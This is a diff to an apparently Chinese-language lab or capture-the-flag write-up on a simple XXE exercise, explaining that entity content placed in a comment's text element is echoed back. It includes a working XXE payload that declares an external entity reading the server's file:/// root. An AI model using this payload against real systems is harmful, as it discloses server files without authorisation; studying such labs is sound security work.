@@ -416,22 +416,21 @@ Login一下 可以发现数据，用该数据登录即可：
 1. 简单 XXE 
 提交个评论，抓个包：
 ![输入图片说明](https://s2.loli.net/2023/03/22/4UTVX9hrxDni57S.png)
-
-`<text></text>`标签之前的内容是会显示在评论区的，因此如果在此处引用外部实体，外部实体的内容也是可以显示在评论区的。
+`<text></text`>标签之前的内容是会显示在评论区的，因此如果在此处引用外		部实体，外部实体的内容也是可以显示在评论区的。
 修改一下：
-
-> <?xml version="1.0"?>
+```
+<?xml version="1.0"?>
 <!DOCTYPE cat [
   <!ENTITY root SYSTEM "file:///">
 ]>
 <comment>  <text>&root;</text></comment>
-
+```
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTEyMTA2MDU2NDYsNDk1NDE0Nzk1LDE3MD
-QyODQzNjAsMTg5MjU5MDk2NCw5OTA2MjQ4NiwtOTE5MDY4NTA0
-LDE2MzA3NDA0NTAsLTEwMTMyNDgxNzQsLTE4MzI5MDAwMzEsLT
-MxNTU1NDYyOCwtNjY2NTA3MDcsMTA3ODgxNjk3NiwtMTQ4NjE5
-MzA1OSw1NjU4OTY2NSw1MDI1NDg3MCwxOTgyOTA5ODE2LC0xOD
-UyMjI1MTYwLDIwMTMwNTc4OTYsLTExMzU2OTQyMDIsLTExMjkx
-ODA1MTddfQ==
+eyJoaXN0b3J5IjpbMjc2ODE2OTk2LDQ5NTQxNDc5NSwxNzA0Mj
+g0MzYwLDE4OTI1OTA5NjQsOTkwNjI0ODYsLTkxOTA2ODUwNCwx
+NjMwNzQwNDUwLC0xMDEzMjQ4MTc0LC0xODMyOTAwMDMxLC0zMT
+U1NTQ2MjgsLTY2NjUwNzA3LDEwNzg4MTY5NzYsLTE0ODYxOTMw
+NTksNTY1ODk2NjUsNTAyNTQ4NzAsMTk4MjkwOTgxNiwtMTg1Mj
+IyNTE2MCwyMDEzMDU3ODk2LC0xMTM1Njk0MjAyLC0xMTI5MTgw
+NTE3XX0=
 -->
